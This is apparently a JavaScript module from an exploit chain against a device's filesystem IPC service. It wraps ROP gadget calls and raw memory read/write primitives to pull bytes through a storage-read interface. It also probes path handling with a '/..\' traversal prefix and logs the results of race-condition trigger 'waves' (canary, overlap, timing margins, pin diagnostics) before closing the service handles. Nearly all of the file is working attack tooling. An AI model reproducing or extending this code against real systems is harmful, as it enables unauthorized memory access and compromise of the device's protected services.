import coreRuntime from "../runtime.mjs";

const {
  GADGET_MEMSET,
  allocPage,
  call_rop,
  closeHandle,
  hex32,
  ipcStorageRead,
  prepPacket,
  read32,
  read64,
  read8,
  sendIPC,
  write32,
  write8,
  writeXDesc
} = coreRuntime;

// ── Cache-mapped memory I/O ───────────────────────────────────────────────

export function readFsAddressBytes(input) {
    const config = input.config;
    let addressPlan = input.addressPlan;
    let candidateHandle = input.candidateHandle;
    let address = input.address;
    let length = input.length;
    let outputBuf = input.outputBuf;
    let allowedWindow = input.allowedWindow;
    let materializeBytes = input.materializeBytes;
    if (allowedWindow &&
        (!Number.isSafeInteger(allowedWindow.start) ||
            !Number.isSafeInteger(allowedWindow.end) ||
            allowedWindow.end <= allowedWindow.start))
        return {ok: false, error: "explicit address window is invalid"};
    var allowedStart = 0;
    if (allowedWindow) {
        allowedStart = allowedWindow.start;
    } else if (addressPlan && addressPlan.lowerWindow) {
        allowedStart = addressPlan.lowerWindow.proposedStart;
    }

    var allowedEnd = 0;
    if (allowedWindow) {
        allowedEnd = allowedWindow.end;
    } else if (addressPlan) {
        allowedEnd = addressPlan.target + config.CONTROL_SIZE;
    }

    if (!Number.isSafeInteger(address) || !Number.isInteger(length) ||
        length <= 0 || !Number.isSafeInteger(address + length) ||
        !addressPlan || !addressPlan.lowerWindow ||
        !Number.isSafeInteger(allowedStart) ||
        !Number.isSafeInteger(allowedEnd) || allowedEnd <= allowedStart ||
        address < allowedStart || address + length > allowedEnd)
        return {ok: false, error: "address is outside its explicit bounded window"};

    var copyBytes = materializeBytes !== false;
    var bytes = copyBytes ? [] : null;
    var currentAddress = address;
    var remaining = length;
    while (remaining > 0) {
        var fileOffset = currentAddress - addressPlan.addressBias;
        var bucketIndex = Math.floor(fileOffset / config.CONTROL_SIZE) *
            config.CONTROL_SIZE % config.ROOT_CAPTURE_CHUNK;
        var requestOffset;
        var prefix = 0;
        var take;
        if (bucketIndex === 0) {
            requestOffset = fileOffset;
            take = Math.min(remaining, config.ROOT_CAPTURE_CHUNK);
        } else {
            requestOffset = Math.floor(fileOffset / config.ROOT_CAPTURE_CHUNK) *
                config.ROOT_CAPTURE_CHUNK;
            prefix = fileOffset - requestOffset;
            take = Math.min(remaining, config.ROOT_CAPTURE_CHUNK - prefix);
        }
        var requestSize = prefix + take;
        if (!copyBytes && (prefix !== 0 || take !== length ||
            remaining !== length))
            return {ok: false,
                error: "buffer-only reads require one aligned cache chunk"};
        if (requestOffset < 0 || requestSize <= 0 ||
            requestOffset + requestSize > addressPlan.storageSize ||
            addressPlan.addressBias + requestOffset < allowedStart ||
            addressPlan.addressBias + requestOffset + requestSize > allowedEnd)
            return {ok: false, error: "aligned read is outside its explicit bounded window"};

        call_rop(GADGET_MEMSET, outputBuf, 0xA5n, BigInt(requestSize));
        var reply = ipcStorageRead(candidateHandle, requestOffset,
            requestSize, outputBuf);
        if (reply.error !== 0)
            return {ok: false, fatal: true,
                error: "IStorage::Read=" + hex32(reply.error) +
                    " transport=" + (reply.transport == null
                        ? "unknown" : hex32(reply.transport)) +
                    " cmif=" + (reply.cmifError == null
                        ? "none" : hex32(reply.cmifError)) +
                    " offset=0x" + requestOffset.toString(16) +
                    " size=0x" + requestSize.toString(16)};
        var nonPoison = copyBytes
            ? hasByteDifferent(outputBuf + BigInt(prefix), take, 0xA5)
            : hasByteDifferentFast(outputBuf + BigInt(prefix), take, 0xA5);
        if (!nonPoison)
            return {ok: false, fatal: true,
                error: "read window remained poison"};

        if (copyBytes) {
            for (var i = 0; i < take; i++)
                bytes.push(Number(read8(outputBuf + BigInt(prefix + i))));
        }
        currentAddress += take;
        remaining -= take;
    }
    return {ok: true, bytes: bytes, buffer: outputBuf, bufferOffset: 0};
}

// ── Formatting utilities ──────────────────────────────────────────────────

export function pad2(n) { return n < 10 ? "0" + n : "" + n; }
export function padRight(s, len) {
    while (s.length < len) s += " ";
    return s;
}

export function formatWaveSummaryLine(id, profile, result, verdict, input) {
    const config = input.config;
    var canary;
    if (result.canaryType === 0) {
        canary = "DIR";
    } else if (result.canaryType === 1) {
        canary = "file";
    } else if (result.canaryType == null) {
        canary = "?";
    } else {
        canary = "err";
    }

    var rejects = "-";
    if (result.rejections && result.rejections.length) {
        rejects = result.rejections.join(",");
    }

    var changedPaths = "none";
    if (result.changedPaths && result.changedPaths.length) {
        changedPaths = result.changedPaths.join(",");
    }

    var windowStatus = "no";
    if (result.window) {
        windowStatus = "pass";
    }

    var margin = "NA";
    if (result.margin != null) {
        margin = result.margin + "us";
    }

    var triggerStatus = "clear";
    if (result.triggerAborted) {
        triggerStatus = "aborted";
    }

    var preRelease = "NA";
    if (result.preReleaseUsed != null) {
        preRelease = "0x" + Number(result.preReleaseUsed).toString(16);
    }

    var isControlProfile = profile === "abort-control" ||
        profile === "abort-hole-control" || profile === "extent-absent" ||
        profile === "extent-present" || profile === "negative" ||
        profile === "positive";
    var line = "Wave " + pad2(id) + " [" + profile + "] " + verdict +
        " | window=" + windowStatus +
        " overlap=" + result.shape + "/10 margin=" +
        margin +
        " trigger=" + triggerStatus +
        " canary=" + canary +
        " paths=" + changedPaths +
        " preRelease=" + preRelease +
        " gates=" + rejects;

    var failedSends = [];
    for (var si = 0; result.sendCodes && si < result.sendCodes.length; si++) {
        if (result.sendCodes[si] !== 0) {
            var sendCode = result.sendCodes[si];

            if (sendCode == null) {
                sendCode = 0xFFFFFFFF;
            }

            failedSends.push(config.roleShort[si] + ":" +
                hex32(sendCode));
        }
    }
    if (failedSends.length) {
        line += " tx=" + failedSends.join("/");
    }

    if (isControlProfile) {
        if (result.canaryResult != null) {
            line += " canaryIPC=" + hex32(result.canaryResult) + "/t" + canary;
        }

        if (result.triggerResult != null) {
            line += " triggerIPC=" + hex32(result.triggerResult) +
                "/t" + result.triggerType;
        }

        if (result.postCanaryHealth) {
            var health = result.postCanaryHealth;
            line += " postTx=" + hex32(health.transport) + " post=" +
                hex32(health.result) + "/t" + health.type +
                " healthy=" + health.healthy;
        }

        if (result.observedCanaryRedirect != null) {
            line += " flipObserved=" + result.observedCanaryRedirect;
        }

        if (result.guardSamples) {
            var guards = result.guardSamples;
            line += " guards=" + guards.completed + "/" + guards.earlyHole +
                "/" + guards.spacing;
        }

        if (result.pinDiagnostics && result.pinDiagnostics.created) {
            var pin = result.pinDiagnostics;
            var persistentBytes = pin.persistentBytes;
            if (persistentBytes == null) {
                persistentBytes = "NA";
            }

            var startOffset = "NA";
            if (pin.startOffsetUs != null) {
                startOffset = pin.startOffsetUs.toFixed(0);
            }

            var endMargin = "NA";
            if (pin.endMarginUs != null) {
                endMargin = pin.endMarginUs.toFixed(0);
            }

            line += " pin=" + hex32(pin.result) + " moves/copies=" +
                pin.moves + "/" + pin.copies + " cost=" +
                persistentBytes +
                "/" + pin.expectedBytes + " gaps(start/end)=" +
                startOffset + "/" + endMargin +
                "us shape/cost/window=" + pin.shapeOk + "/" + pin.costOk +
                "/" + pin.windowOk + " restored=" + pin.restored;
        }
    } else {
        if (result.canaryResult != null && result.canaryResult !== 0) {
            line += " canaryResult=" + hex32(result.canaryResult);
        }

        if (result.triggerAborted) {
            line += " triggerResult=" + hex32(result.triggerResult);
        }
    }

    if (result.shapeMissing && result.shapeMissing.length) {
        line += " shapeMissing=" + result.shapeMissing.join("/");
    }

    if (result.marginSlackUs != null) {
        line += " marginSlack=" + result.marginSlackUs.toFixed(0) + "us";
    }

    if (result.preReleaseSlackBytes != null) {
        line += " preSlack=" + result.preReleaseSlackBytes + "B";
    }

    if (isControlProfile && result.roleTimings) {
        var timingParts = [];
        for (var ti = 0; ti < config.roleLabels.length; ti++) {
            var timing = result.roleTimings[config.roleLabels[ti]];
            if (timing) {
                timingParts.push(config.roleShort[ti] + "=" +
                    timing.relStartUs.toFixed(0) + ".." +
                    timing.relEndUs.toFixed(0));
            }
        }
        line += " spans(us=relTriggerStart/end):" + timingParts.join(",");
    }

    if (result.readResult != null && result.readResult !== 0) {
        line += " read=" + hex32(result.readResult);
    }

    return line;
}

export function readHexBytes(addr, count) {
    var hex = "";
    for (var i = 0; i < count; i++)
        hex += ("0" + Number(read8(addr + BigInt(i))).toString(16)).slice(-2);
    return hex;
}

export function bytesToHex(bytes) {
    var out = "";
    for (var i = 0; i < bytes.length; i++)
        out += ("0" + bytes[i].toString(16)).slice(-2);
    return out;
}

export function ipcGetEntryTypeRawBytes(handle, bytes) {
    var pathBuf = allocPage(0x1000);
    for (var i = 0; i < bytes.length; i++)
        write8(pathBuf + BigInt(i), BigInt(bytes[i]));
    var inputMatches = true;
    for (var i = 0; i < bytes.length; i++) {
        if (Number(read8(pathBuf + BigInt(i))) !== bytes[i]) {
            inputMatches = false;
            break;
        }
    }

    var pkt = allocPage(0x2000);
    prepPacket(pkt, (4 | (1 << 16)) >>> 0, 8, []);
    writeXDesc(pkt, 8, pathBuf, bytes.length);
    write32(pkt + 0x10n, 0x49434653n);
    write32(pkt + 0x18n, 7n);
    var transport = Number(sendIPC(handle, pkt)) >>> 0;
    var type = Number(read32(pkt)) & 0xFFFF;
    var magic = Number(read32(pkt + 0x10n)) >>> 0;
    if (transport !== 0 || type !== 0 || magic !== 0x4F434653) {
        return {ok: false, transport: transport, type: type, magic: magic,
            result: 0xFFFFFFFF, canonical: 0xFFFFFFFF,
            inputMatches: inputMatches};
    }
    var result = Number(read32(pkt + 0x18n)) >>> 0;
    return {ok: true, transport: transport, type: type, magic: magic,
        result: result, canonical: result & 0x3FFFFF,
        inputMatches: inputMatches};
}

// ── Address and encoding helpers ──────────────────────────────────────────

export function checkAddressHeaderEncoding(headerBytes, input) {
    let savedHandle = input.savedHandle;
    var prefix = [0x2F, 0x2E, 0x2E, 0x5C]; // "/..\\"
    var invalidBytes = prefix.concat([0xFF, 0]);
    var encodedBytes = prefix.concat(headerBytes, [0]);
    var invalid = ipcGetEntryTypeRawBytes(savedHandle, invalidBytes);
    var encoded = ipcGetEntryTypeRawBytes(savedHandle, encodedBytes);
    return {
        invalid: invalid,
        encoded: encoded,
        ok: invalid.ok && encoded.ok && invalid.inputMatches &&
            encoded.inputMatches && invalid.canonical === 0x2EEA02 &&
            encoded.canonical === 0x2EEC02
    };
}

export function buffersEqual(a, b, length) {
    for (var i = 0; i < length; i++)
        if (Number(read8(a + BigInt(i))) !==
            Number(read8(b + BigInt(i)))) return false;
    return true;
}

export function hasByteDifferent(addr, length, value) {
    for (var i = 0; i < length; i++)
        if (Number(read8(addr + BigInt(i))) !== value) return true;
    return false;
}

export function hasByteDifferentFast(addr, length, value) {
    var repeatedWord = BigInt(value) * 0x0101010101010101n;
    var offset = 0;
    for (; offset + 8 <= length; offset += 8) {
        if (read64(addr + BigInt(offset)) !== repeatedWord) return true;
    }
    for (; offset < length; offset++)
        if (Number(read8(addr + BigInt(offset))) !== value) return true;
    return false;
}

export function scanPointerWords(addr, length, limit) {
    var found = [];
    for (var off = 0; off + 8 <= length && found.length < limit; off += 8) {
        var value = read64(addr + BigInt(off));
        if (value >= 0x100000000n && value < 0x8000000000n &&
            value % 8n === 0n)
            found.push("+0x" + off.toString(16) + "=0x" +
                value.toString(16));
    }
    return found.join(" ") || "none";
}

export function cleanup(input) {
    let auxiliaryStorageHandle = input.auxiliaryStorageHandle;
    let candidateHandle = input.candidateHandle;
    let domainSession = input.domainSession;
    let extentTriggerHandle = input.extentTriggerHandle;
    let pinHandle = input.pinHandle;
    let rootClones = input.rootClones || [];
    let rootSession = input.rootSession;
    let saveClones = input.saveClones || [];
    let savedHandle = input.savedHandle;
    let storageHandle = input.storageHandle;
    let temporaryHandle = input.temporaryHandle;
    let preserveTemporaryHandleForCleanup =
        input.preserveTemporaryHandleForCleanup === true;
    let triggerHandle = input.triggerHandle;
    if (candidateHandle) closeHandle(candidateHandle);
    if (pinHandle) closeHandle(pinHandle);
    if (extentTriggerHandle) closeHandle(extentTriggerHandle);
    if (triggerHandle) closeHandle(triggerHandle);
    if (storageHandle) closeHandle(storageHandle);
    if (auxiliaryStorageHandle) closeHandle(auxiliaryStorageHandle);
    for (var i = 0; i < rootClones.length; i++) closeHandle(rootClones[i]);
    for (var i = 0; i < saveClones.length; i++) closeHandle(saveClones[i]);
    if (savedHandle) closeHandle(savedHandle);
    if (temporaryHandle && !preserveTemporaryHandleForCleanup)
        closeHandle(temporaryHandle);
    if (domainSession) {
        closeHandle(domainSession.handle);
        domainSession = null;
    }
    if (rootSession) closeHandle(rootSession);
    return {closed: true};
}
